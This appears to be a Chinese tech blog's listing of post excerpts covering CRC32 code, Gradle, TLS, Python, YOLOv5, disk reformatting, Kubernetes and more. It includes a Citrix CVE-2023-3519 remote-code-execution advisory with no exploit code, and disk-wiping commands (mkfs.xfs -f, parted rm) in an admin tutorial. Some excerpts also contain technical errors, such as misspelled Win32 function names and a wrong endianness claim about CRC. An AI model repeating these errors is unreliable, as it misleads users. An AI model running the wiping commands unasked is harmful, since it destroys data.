c #include &lt;stdint.h&gt; uint32_t ether_crc_le(uint8_t *data, uint32_t size) { uint32_t crc = 0xffffffff; while (size--) { crc ^= *data++; for (int i = 0; i &lt; 8; ++i) { if (crc &amp; 1) { crc &gt;&gt;= 1; crc ^= 0xedb88320; } else { crc &gt;&gt;= 1; } } } return crc ^ 0xffffffff; } 函数解析 函数接受两个参数：一个指向数据的指针和数据的大小。它返回一个32位的CRC值。
函数使用一个32位的变量crc来存储CRC值，并将其初始化为0xffffffff。
然后，函数使用一个循环来处理每个数据字节。在循环中，函数首先将当前数据字节与crc进行异或操作，然后对crc进行8次迭代。
在每次迭代中，函数检查crc的最低位是否为1。如果是，它将crc右移一位，并与0xedb88320进行异或操作。这个0xedb88320是一个预定义的多项式，用于计算以太网帧的CRC。
如果crc的最低位不是1，函数只将crc右移一位。
循环结束后，函数返回crc与0xffffffff进行异或操作的结果，以得到最终的CRC值。
需要注意的是，此函数计算的CRC是以小端字节序（little endian）表示的。这意味着在计算CRC之前，需要确保数据是以小端字节序存储的。如果数据是以大端字节序存储的，需要在计算CRC之前进行字节序转换
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46b5726b2f7394784c3fa571d8248464/" rel="bookmark">
			AndroidStudio Gradle下载速度慢解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在软件里点开工程文件下的 build.gradle
2…在 buildscript 和 allprojects 的 repositories 中分别注释掉 jcenter()
3.在 buildscript 和 allprojects 的 repositories 分别添加：maven{url ‘http://maven.aliyun.com/nexus/content/groups/public/’}
4.再在 buildscript 的 repositories 添加：maven{url “https://jitpack.io”}
最终图片：
实际效果证明：下载速度能对得起自己的网速了！
如果还是下载慢，建议换个上网的方式，比如手机开热点，还是不行，就用不同运营商的手机开热点，至于为什么，等真的还是慢时自己试试就知道了。
网上还有一种通过自己下载好对应文件然后再替换方法，但是治标不治本，不推荐，有兴趣可以看看，这个帖子写的很清楚：https://blog.csdn.net/u014471160/article/details/78508624
如果你搞定了这一个下载ｇｒａｄｌｅ的问题，可能还会遇到这一个问题：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92b51ba0e652296861914bafba741529/" rel="bookmark">
			关于网络通信安全协议的一些知识（ssl,tls,CA,https）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先了解一下http协议的变迁。
http1.0默认短连接，1.1默认长连接并且可以管道传输，但是存在队头阻塞问题；
https就是在tcp和http之间加了SSL/TLS层。
http2也是安全的，改进是hpack二进制和编码压缩减小体积，stream没有队头阻塞了（TCP层还有），以及服务器主动推送功能；
http3把TCP变成udp了， 并且在上层用QUIC协议保证可靠传输，速度更快了，并且QUIC,TLS在一层可以合并，所以连接只需要1RTT就够了，基于连接id还可以实现连接迁移。
SSL/TLS
tls是升级版的ssl,ssl到3.0之后就改名tls1.0了。ssl分成两层：ssl记录协议和ssl握手协议。记录协议主要负责对tcp的数据进行封装压缩加密，相当于表示层了。握手协议就是常说的https的四次握手过程（建立连接，协商秘钥，协商加密算法），不过四次握手还涉及到CA证书的验证。ssl叫习惯了
tls的改进点在于：HMAC算法保证更安全的MAC功能；更多的告警代码；支持的加密算法不同。
到现在看来，https包含了ssl/tls，然后ssl协议里面又会涉及到CA证书的验证过程保证双方的可靠性。以及加密和数字摘要保证消息不被监听和篡改。
（关于加密算法
对称加密算法：加密解密用一种，DES,DES3等等，但是因为有可能对称秘钥传输过程会被窃取所以不安全；
非对称加密：公钥加密，私钥解密。如RSA，由于私钥不会传输，所以信息无法被窃取。但是速度慢，所以一般用来对秘钥进行加密的。
四次握手大致过程: hello打招呼，把密码列表版本号以及随机数给服务端，服务端也会生成随机数确定密码列表给额客户端；中间有CA证书验证过程，保证服务端合法的；后两次就是客户端利用服务端的公钥加密一个随机数，利用这三个随机数生成对称秘钥，然后尝试加密消息并消息摘要，看看行不行。
）
CA:
是一个颁发数字证书的权威机构。比如GlobalSign、DigiCert 和 GoDaddy。一般浏览器使用的CA证书都是存在于浏览器和操作系统的，所以可以保证CA证书的安全。
CA作用： 确认服务端可靠；并且里面的公钥可以把三个随机数生成对称秘钥然后和服务端私钥结合实现数据加密作用。
C证书链式结构，每个CA有几个子 CA，信任链，所以编程时如果浏览器没有再到操作系统找根证书链，不然耗时。
CA证书有什么：
有不同的格式有的是可编辑的PEM,二进制的DEM. 其中X.509就是可编辑中的一种。
具体的CA证书采用的是X509格式的。主要包含以下三个文件：
key，csr，crt。
key是服务器的私钥，不传输，用于加密解密的。
csr是签名请求文件用于给CA让它签名，签名才有效；
crt:签名后或者自签名（rusttls）的证书：包括服务器公钥，服务器的id信息，以及签名人的信息。
具体rusttls怎么实现签名的？
1、certify的库，主要就是利用内部算法生成一个CA机构，然后把客户端服务端的csr给CA签名。得到
crt文件，存到一个目录中。
2.根据前面得到的 证书，生成clientconfig,serverconfig;
3、利用内2部的connect函数，就可以把stream转换成tlsstream。（实际上就是from into trait）
在开发测试环境中，常见的ssl证书生成的开源工具有openssl,rusttls等。我用的后者，相比openssl,编译连接简单，速度快。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f310dc0473ab7a3bea58066708383178/" rel="bookmark">
			python - 列表和元组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.序列2.列表：打了激素的数组(1)列表的创建(2)连接操作符、成员操作符、索引、切片、for循环 3.列表的使用方法（1）增删改查（2）其他 4.元组:带了紧箍咒的列表（1）元组的创建、特性（2）常用方法 5.命名元组6.is和== 的区别7.值的引用、深拷贝、浅拷贝 1.序列 成员有序排列的,且可以通过下标偏移量访问到它的一个或者几个成员,这类类型统称为序列。序列数据类型包括:字符串,列表,和元组类型。特点: 都支持下面的特性
索引与切片操作符
成员关系操作符(in , not in)
连接操作符(+) &amp; 重复操作符(*) 2.列表：打了激素的数组 (1)列表的创建 (2)连接操作符、成员操作符、索引、切片、for循环 3.列表的使用方法 （1）增删改查 （2）其他 4.元组:带了紧箍咒的列表 （1）元组的创建、特性 （2）常用方法 5.命名元组 Tuple还有一个兄弟，叫namedtuple。虽然都是tuple，但是功能更为强大。
6.is和== 的区别 7.值的引用、深拷贝、浅拷贝 深拷贝和浅拷贝最根本的区别在于是否真正获取一个对象的复制实体，而不是引用。
假设B复制了A，修改A的时候，看B是否发生变化:
如果B跟着也变了，说明是浅拷贝，拿人手短! (修改堆内存中的同一个值)
如果B没有改变，说明是深拷贝，自食其力! （修改堆内存中的不同的值)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/076c1887aa53f63eb5bb5c49973a1e3b/" rel="bookmark">
			python-字典、集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 一、集合1.集合的创建2.集合的特性3. 集合的常用操作 :增删查4. 拓展: frozenset不可变的集合练习题 二、字典1.字典的创建2.字典的特性3.字典的常用方法（1）查看（2）增加和修改（3）删除 4.遍历字典5.字典的拓展 三、小汇总 一、集合 1.集合的创建 2.集合的特性 3. 集合的常用操作 :增删查 4. 拓展: frozenset不可变的集合 练习题 import random n = int(input("输入n:")) s=set() for i in range(n): s.add(random.randint(1,1000)) print(sorted(s,reverse=True)) 二、字典 1.字典的创建 2.字典的特性 3.字典的常用方法 （1）查看 （2）增加和修改 （3）删除 4.遍历字典 5.字典的拓展 有序和无序
三、小汇总 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2ff7398be31ee1738c80dec0d55474e/" rel="bookmark">
			OpenCV DNN模块推理YOLOv5 ONNX模型方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 概述1. 环境部署`YOLOv5`算法`ONNX`模型获取`opencv-python`模块安装 2.关键代码2.1 模型加载2.2 图片数据预处理2.3 模型推理2.4 推理结果后处理2.4.1 NMS2.4.2 score_threshold过滤2.4.3 bbox坐标转换与还原 3. 示例代码(可运行)3.1 未封装3.2 封装成类调用 概述 本文档主要描述python平台，使用opencv-python深度神经网络模块dnn,推理YOLOv5模型的方法。
文档主要包含以下内容：
opencv-python模块的安装YOLOv5模型格式的说明ONNX格式模型的加载图片数据的预处理模型推理推理结果后处理，包括NMS,cxcywh坐标转换为xyxy坐标等关键方法的调用与参数说明完整的示例代码 1. 环境部署 YOLOv5算法ONNX模型获取 可通过官方链接下载YOLOv5的官方预训练模型，模型格式为pt.下载链接
YOLOv5官方项目提供了pt格式模型转换为ONNX格式模型的脚本，项目链接
模型导出指令：
python export --weights yolov5s.pt --include onnx 注：导出文件执行指令所需环境安装配置参考官方项目README文档即可，不在赘述。
opencv-python模块安装 创建虚拟环境并激活
conda create -n opencv python=3.8 -y conda activate opencv pip安装opencv-python模块
pip install opencv-python 注: 通过pip安装opencv-python模块时，默认安装仅支持CPU推理，如需支持GPU推理，需从源码编译安装，具体安装方法较复杂，这里不在赘述。
2.关键代码 2.1 模型加载 opencv-python模块提供了readNetFromONNX方法，用于加载ONNX格式模型。
import cv2 cv2.dnn.readNetFromONNX(model_path) 2.2 图片数据预处理 数据预处理步骤包括resize，归一化，颜色通道转换，NCWH维度转换等。
resize之前，有一个非常常用的trick来处理非方形的图片，即计算图形的最长边，以此最长边为基础，创建一个正方形，并将原图形放置到左上角，剩余部分用黑色填充，这样做的好处是，不会改变原图形的长宽比，同时也不会改变原图形的内容。
# image preprocessing, the trick is to make the frame to be a square but not twist the image row, col, _ = frame.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2ff7398be31ee1738c80dec0d55474e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31c6009aa80a3a8d6d7239d30d4e189b/" rel="bookmark">
			centos更改磁盘格式ext4--＞xfs
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		lsblk ##查看磁盘信息
lsblk -f ##查看磁盘信息
此处以sdb为例
更改sdb1的格式为xfs
[root@ljd ~]# mkfs.xfs -f -n ftype=1 /dev/sdb1
结果如下
此时已经更改成功 可以挂载磁盘了
设置自动挂载
vim /etc/fstab
添加如下内容
/dev/sdb1 /tmp xfs defaults 0 0 保存退出后
执行mount -a生效
再次查看如下
其他操作
1.查看磁盘
fdisk -l
2.查看挂载
df -h
3.卸掉挂载
umount /dev/sd&lt;盘符&gt; // 注意在卸载前检查目录是否存在价值文件，再卸载
4.先注释掉/etc/fstab中卸载掉的信息
// 例： #/dev/sdb03 /data ext4 defaults 0 1 预防分区后自动挂载。
5.删掉磁盘分区
parted -s /dev/sd&lt;盘符&gt; rm 3 // 3,4 代表第几个分区,这里注意不要删除/根分区或BIOS分区， 一块磁盘情况下1，2一般有根/分区，
parted -s /dev/sd&lt;盘符&gt; rm 4
6.磁盘分区 按照实际情况进行分区 // !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31c6009aa80a3a8d6d7239d30d4e189b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cddc7ae7d76622128df674755a2dca71/" rel="bookmark">
			AI绘画核心技术你值得拥有
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 绘画,是艺术创作中最富魅力的领域之一。它需要丰富的想象力,娴熟的技巧,以及独特的视角。然而,传统绘画需要耗费大量时间积累经验,门槛较高。
现在,AI绘画为我们打开了通往艺术殿堂的大门。它能借助算法之力,根据文本描述自动生成精美绝伦的图像。这意味着,我们所有人,都可以通过语言创造艺术,实现绘画梦。
AI绘画的最大特点是:
1. 易用性强
用户无需掌握绘画技巧,只需用文字描述图像内容,AI就可以自动生成效果图。大大降低了创作门槛。
2. 生成效果优异
AI算法通过学习海量画作,可以生成细节丰富、风格多变的图像,达到乱真级效果。
3. 应用范围广泛
可用于游戏、电影人设、广告banner、书籍插画等领域,丰富创意设计师的作品库。
4. 个性化程度高
可以通过修改文字描述,生成千变万化的图像,满足个性化需求。
5. 效率极高
一键生成图像,大幅提升工作效率,秒产图像。
6. 持续迭代升级
算法不断更新迭代,支持生成更高清、更逼真的图像。
7. 降低创作成本
无需雇佣设计师或画师,直接由AI生成图像,降低创作成本。
目前极客时间推出AI绘画核心技术的课程，课程介绍如下：
报名地址
可以通过以上链接了解课程详情及报名 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/109b0063bba0c2de8092e99d6197afee/" rel="bookmark">
			诗：大境门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		半世风霜硝烟染，一朝坐镇世间宁。
本可三关齐名号，唯有此处独称门。 颜体挥就山河好，大字当头气自浑。
古来多为争战地，崇山崴峨河谷銘！
写于 2014-2-10 李重天
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ef40e74e65dd8514489d304894ee82c/" rel="bookmark">
			【Matlab】Matlab_simulink绘制伯德图从选型到出图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考链接：
simulilnk频率响应分析方法 - 知乎 (zhihu.com)
Matlab中用Simulink快速画Bode图及 .m 文件画Bode图_qq_41574890的博客-CSDN博客_simulink怎么画伯德图
1.打开软件，选择Simulink ​
​
2.点击Library Browser，在Simulink下选择传递函数、输入、输出，选中直接拖出来即可 ​
​​
​
3.鼠标双击传递函数模块进行系数设置，由高次到低次，低次不足补零 传递函数：
4.开始分析 ​​​​​​注意：一定要把Analysis I/Os处改为Root Level Inports and Outports，不然容易报错
5.查看结果 6.具体细节： ①显示网格：鼠标右键单击伯德图空白处，勾选Grid
②设置X、Y轴范围、单位、含义等：鼠标右键单击伯德图空白处，选择Properties
③显示裕度、响应峰值等：鼠标右键单击伯德图空白处，选择Characteristics
7.其他操作 ①查看传递函数(当传递函数不止一个或者模型中出现电阻或电容等其他元件时)
方法一：点击Bode图后会自动跳出Linearization Result details for linsys1,将State Space改为Zero-Pole-Gain.
方法二：出现伯德图后如下图点击，再将State Space改为Zero-Pole-Gain.
②在一张伯德图上显示原来图像和改进后的图像
工作区中直接在原模块中修改，其余操作不变，只是出图的时候点击Bode Plot 1,新的图像就会和原来图像在一张表中(如果点击Bode新图像会在新的表中)
改进后的传递函数：
PS：
在图像中点击线上的点可以显示具体参数
只查看结果的话，不用先保存即可运行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebb75e791aaf621f9665d52a8530e02d/" rel="bookmark">
			【Kubernetes运维篇】ingress-nginx实现业务灰度发布详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、理论：实现灰度发布的几种场景1、场景一：将新版本灰度给部分用户2、场景二：按照比例流程给新版本3、实现灰度发布字段解释 二、实践：1、实验前提环境2、基于Request Header(请求头)进行流量分割3、基于Cookie进行流量切分4、基于服务权重进行流量切分 一、理论：实现灰度发布的几种场景 1、场景一：将新版本灰度给部分用户 假设线上运行了一套对外提供 7 层服务的 Service A 服务，后来开发了个新版本 Service AA需要上线，但不想直接替换掉原来的 Service A，希望先灰度一小部分用户，等运行一段时间足够稳定了再逐渐全量上线新版本，最后平滑下线旧版本。
这个时候就可以利用 Nginx Ingress 基于 Header 或 Cookie 进行流量切分的策略来发布，业务使用 Header 或 Cookie 来标识不同类型的用户，我们通过配置 Ingress 来实现让带有指定 Header 或 Cookie 的请求被转发到新版本，其它的仍然转发到旧版本，从而实现将新版本灰度给部分用户。
2、场景二：按照比例流程给新版本 假设线上运行了一套对外提供 7 层服务的 Service B 服务，后来修复了一些问题，需要灰度上线一个新版本 Service BB，但又不想直接替换掉原来的 Service B而是让先切 10% 的流量到新版本。
等观察一段时间稳定后再逐渐加大新版本的流量比例直至完全替换旧版本，最后再滑下线旧版本，从而实现切一定比例的流量给新版本。
3、实现灰度发布字段解释 Ingress-Nginx是一个K8S ingress工具，支持配置Ingress Annotations来实现不同场景下的灰度发布和测试。 Nginx Annotations 支持以下几种Canary规则：
假设我们现在部署了两个版本的服务，老版本和canary版本
nginx.ingress.kubernetes.io/canary-by-header：基于Request Header的流量切分，适用于灰度发布以及 A/B 测试。当Request Header 设置为 always时，请求将会被一直发送到 Canary 版本；当 Request Header 设置为 never时，请求不会被发送到 Canary 入口。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebb75e791aaf621f9665d52a8530e02d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddfaa274448572b0fdd555175c5188c5/" rel="bookmark">
			vue项目中使用m3u8格式播放大视频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景 网站中播放大视频时经常卡顿，无法顺利播放，在查找解决方案时发现很多文章建议使用m3u8流媒体播放代替MP4播放，做了下测试，现总结记录下测试过程中遇到的问题与解决办法。
二、测试实现 1.使用ffmpeg做视频转换
1）下载ffmpeg
FFmpeg github
2）在环境变量path中加入配置，以便在控制台使用指令
3）使用指令将MP4格式视频转为m3u8格式
ffmpeg.exe -i video.mp4 -hls_time 60 -hls_list_size 0 -f hls a.m3u8
上述指令中 -i video.mp4 表示输入视频源为video.MP4（此处已用指令打开视频所目录），-hls_time 60表示视频分割时长为60秒（为了保证画面连贯帧数切出的视频长度会有几秒的波动范围），-hls_list_size 0表示保留所有的分割片段（如果不加这段指令默认只保留5个片段），-f hls表示使用hls流协议输出视频（通常情况可以不添加此段指令，一般是自动检测输入文件，并根据输出文件的文件扩展名判定输出格式），a.m3u8表示将切割视频的索引以此名字文件输出。
指令执行完毕后会输出一个a.m3u8的索引文件和若干个 ts视频文件
*在使用指令转换完后发现视频整体大小变小了很多，将2G左右的MP4视频转成200M左右的小视频片段，画质和音频播放起来也没有特别大的体感差异，暂不明白具体原理，试用一段时间看是否有坑。
2.VUE项目使用
1）项目安装videojs视频播放库及其流媒体传输协议支持
npm install --save video.js
npm install --save videojs-contrib-hls
在需要播放视频的页面中引入videojs及对应的样式文件
import videojs from "video.js";
import "video.js/dist/video-js.css";
video-js.css样式文件无法通过vscode的自动补齐找到，不设置样式时页面会显示下方的配置信息
示例代码：
&lt;template&gt; &lt;q-page padding&gt; &lt;div class="row"&gt; &lt;div class="col-6"&gt; &lt;video id="myVideo" class="video-js vjs-default-skin vjs-fluid"&gt;&lt;/video&gt; &lt;/div&gt; &lt;/div&gt; &lt;/q-page&gt; &lt;/template&gt; &lt;script&gt; import { defineComponent } from "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddfaa274448572b0fdd555175c5188c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53d4a2695a887180f214c434caea3aec/" rel="bookmark">
			跳高比赛1——set-结构体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 李老师正在分析所有同学参加跳高比赛后的数据，想绘制出身高与跳高成绩之间的关系曲线。
李老师打算先将 n 个同学的数据做一下排序处理：
每个同学都有两项数据：身高 ℎi​，跳高成绩 si​先按跳高成绩 si​ 从大到小排序，成绩相同时再按身高 ℎi​ 从小到大排序对于两项数据都完全相同的同学，只保留一个同学的数据即可 请你编写程序帮李老师完成这一任务。
输入格式 第一行一个整数 n (10≤≤105)(10≤n≤105)，表示同学的人数。
其后 n 行，每行两个数据，对应为该同学的身高 ℎ(120≤ℎ≤200hi​(120≤hi​≤200，单位：厘米)，及跳高成绩 (80≤≤210si​(80≤si​≤210，单位：厘米 )。
输出格式 输出若干行，为题目要求去重排序后的结果，每行为一个同学的数据 ℎi​ 和 si​，中间用 1 个空格隔开。
样例 #1 样例输入 #1 6 150 80 140 80 150 80 140 90 150 81 140 80 样例输出 #1 140 90 150 81 140 80 150 80 解析
#include &lt;bits/stdc++.h&gt; using namespace std; struct node{ int h,s; }tmp; set&lt;node&gt; st; bool operator &lt; (node a,node b){ if(a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53d4a2695a887180f214c434caea3aec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41af519a572e3b482232b1ebb0c47706/" rel="bookmark">
			KEGG 通路如何找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		链接：
KEGG: Kyoto Encyclopedia of Genes and Genomes
学习链接：
科研干货｜KEGG信号通路数据库轻松上手_哔哩哔哩_bilibili
示例：我要找人的结直肠癌信号通路：
1.
2.
3.
4.
over
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6528e83c31cba3dae203e3005c6ed438/" rel="bookmark">
			【严重】Citrix ADC 和 Citrix Gateway 远程代码执行漏洞（PoC）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		漏洞描述 Citrix ADC是应用程序交付和负载平衡解决方案，Citrix Gateway是一套安全的远程接入解决方案，常用于提供虚拟桌面和远程桌面服务，此外，Citrix ADC还被广泛用作Windows堡垒机。
在 Citrix ADC 和 Citrix Gateway 受影响版本中，如果设备配置为网关（VPN 虚拟服务器、ICA 代理、CVPN、RDP 代理）或身份验证虚拟服务器。攻击者可以利用漏洞在未授权的情况下远程执行代码。
漏洞名称Citrix ADC 和 Citrix Gateway 远程代码执行漏洞漏洞类型代码注入发现时间2023/7/19漏洞影响广度广MPS编号MPS-fkps-ydxqCVE编号 CVE-2023-3519CNVD编号- 影响范围 Citrix ADC@[13.1, 13.1-49.13)
Citrix ADC@[13.0, 13.0)
Citrix ADC@[13.1-FIPS, 13.1-37.159)
Citrix ADC@[12.1-FIPS, 12.1-55.297)
Citrix ADC@[12.1-NDcPP, 12.1-55.297)
NetScaler Gateway@[13.1, 13.1-49.13)
NetScaler Gateway@[13.0, 13.0-91.13)
修复方案 将组件 NetScaler Gateway 升级至 13.1-49.13 及以上版本
将组件 NetScaler Gateway 升级至 13.0-91.13 及以上版本
将组件 Citrix ADC 升级至 13.1-49.13 及以上版本
将组件 Citrix ADC 升级至 13.0 及以上版本
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6528e83c31cba3dae203e3005c6ed438/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41a1fce6f07d49bfcc8c4e0023712183/" rel="bookmark">
			MySQL语句通过腾讯云数据库智能管家的性能与语法优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近公司项目迁移至腾讯云，用的腾讯云MySQL服务器，MySQL负载一直很高，借助云管家优化了一部分SQL语句，提升了部分性能和释放了部分，MySQL内存占用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/706e4679b357e6547b3193023500c3d4/" rel="bookmark">
			ftp传文件越来越慢的原因，以及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FTP 是一种常用的文件传输协议，它基于客户端-服务端模型工作，允许用户通过网络传输文件。但是，有时候在使用 FTP 的过程中，文件传输速度会逐渐变慢，这给用户带来了很多困扰。本文将分析 FTP 传文件变慢的原因，并提出一些解决办法。
一、FTP 传文件变慢的原因 1、网络带宽不够
FTP 传输文件的速度受到网络带宽的影响。当同一网络被多个用户同时使用时，网络带宽就会被分配，从而导致文件传输速度降低。
2、客户端或服务端程序有问题
FTP 客户端和服务端程序也可能存在一些问题，例如版本过期、配置不正确等，这些问题会影响文件传输的速度和可靠性。
3、传输文件的大小和数量
传输大量或大文件时，FTP 传输速度可能会降低。这是由于网络连通性和服务器处理能力限制所造成的，这些因素会延长整个传输过程。
4、网络延迟和丢包
FTP 传输需要通过网络进行，任何网络问题都可能导致文件传输缓慢或失败。网络延迟和丢包是两个常见的问题，尤其是在处理大文件或跨越长距离的网络连接时。
二、解决方案 1、检查网络带宽
检查网络带宽并确保它足够支持传输文件的速度。如果网络带宽有限，可以尝试减少带宽占用量，例如关闭其他带宽密集型应用程序和网络服务。如果你是企业用户，则可以考虑购买更高速的网络带宽来提高 FTP 传输速度。
2、更新 FTP 客户端和服务端程序
更新 FTP 客户端和服务端程序到最新版本，并确保正确地配置程序设置。此外，优化 FTP 服务器设置和调整 FTP 数据连接模式也可能改善传输速度。
3、分批次传输文件
将大文件分成多个较小的部分传输，以减少单个文件传输的时间和风险。此外，可以尝试将传输任务分批次完成，间隔一段时间后再继续下一批传输。
4.提高网络稳定性
使用更稳定和快速的网络连接，例如高速互联网，可以有效提高 FTP 传输速度并减少网络延迟和丢包。此外，还可以使用网络加速器、VPN 等工具来提高网络连接质量。
5.使用镭速传输替代或优化 FTP 协议
使用镭速传输软件可以有效替代或优化 FTP 协议，实现大文件和海量小文件的快速传输。镭速传输提供了以下几种方式：
使用大文件传输系统进行文件管理和加速。大文件传输系统是一款企业级文件加速传输管理平台，支持本地与服务器存储的上传下载、点对点传输、单双向同步等多种模式。用户可以通过 Web 端、PC 客户端、移动端等多种方式访问和操作文件，实现跨平台、跨设备的数据交互。
使用 Proxy 代理加速无需修改原有系统。Proxy 代理加速是一种适用于企业自有系统传输加速的方式，原有应用系统无需进行二次开发，仅通过标准的 Proxy 协议即可集成镭速传输的高速传输能力，节省开发时间与人力成本。
使用 FTP 加速完全兼容 FTP 命令和客户端。FTP 加速是一种完全替代现有 FTP 协议的高效传输软件，能够在现有结构的基础上实现文件的高速传输，使用镭速文件传输协议 FTP 加速后，FTP 传输速度可提升 10-100 倍。FTP 加速还支持断点续传、压缩加密、多线程并发等功能，提高了文件传输的可靠性和安全性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/706e4679b357e6547b3193023500c3d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26b24f02c152f410366bc1a24fcde081/" rel="bookmark">
			【gradle 打包报错】gradle打包是报错：Task :buildSrc:compileJava FAILED Using insecure protocols with repositorie
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 事件起因环境和工具探索过程gradle下载 总结和解决办法：参考内容结束语 事件起因 不想听问题的解决过程的，直接目录跳转总结和解决办法
每次去执行gradle build -x javadoc都会报错，具体报错内容在下方
-x javadoc是排除javadoc内容进行打包，比如说你要跳过测试类可以加上-x test
Task :buildSrc:compileJava FAILED
Run with --stacktrace option to get the stack trace.
Run with --info or --debug option to get more log output.
Run with --scan to get full insights.
Using insecure protocols with repositories, without explicit opt-in, is unsupported. Switch Maven repository ‘Bstek(http://nexus.bsdn.org/content/groups/public/)’ to redi
rect to a secure protocol (like HTTPS) or allow insecure protocols. See https://docs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26b24f02c152f410366bc1a24fcde081/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81e83516ee80c04ec1f9f842125edb6b/" rel="bookmark">
			【多任务编程-线程同步与互斥】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线程同步 线程需要在两种情况下互相进行同步 有多个线程访问共享资源而不使资源被破坏时 当一个线程需要将某个任务以完成的情况通知另外一个或多个线程时 Windows线程通常使用的同步和互斥手段
关键代码段(CriticalSection),
互斥量(Mutex),
信号量(Semaphore),
事件(Event)
用户方式的线程同步 用户方式的线程同步包括互锁函数和关键代码段
用户方式顾名思义是指工作在用户态而不是核心态的。
原子访问：互锁的函数家族。 例:InterlockedIncrement 关键代码段(临界区) 所谓原子访问，是指线程在访问资源的时候能够确保所有的线程都不在同一时间访问相同的资源 关键代码段(临界区) 关键代码段是指一个小的代码段，在代码能够执行前，它必须独占对某些共享资源的访问权。 当然，系统能够抑制你的线程进行运行，但是，在线程退出关键代码段之前，系统不给想要访问相同资源的其他任何线程进行调度 EnterCriticalPolicySection 进入关键代码段 void EnterCriticalSection( LPCRITICAL_SECTION lpCriticalSection ); LeaveCriticalPolicySection 离开关键代码段 void LeaveCriticalSection( LPCRITICAL_SECTION lpCriticalSection ); 使用这两个函数来标志一段关键代码段 关键代码段 例子 LPCRITICAL_SECTION g_cs;
long g_alDataList
在Thread1中操作
{
EnterCriticalSection(&amp;g_cs); // 进入关键代码段
......
// 读取或者写入数组g_alDataList
......
LevelCriticalSection(&amp;g_cs);
}
在Thread2中也需要有同样的形式来标志关键代码段.
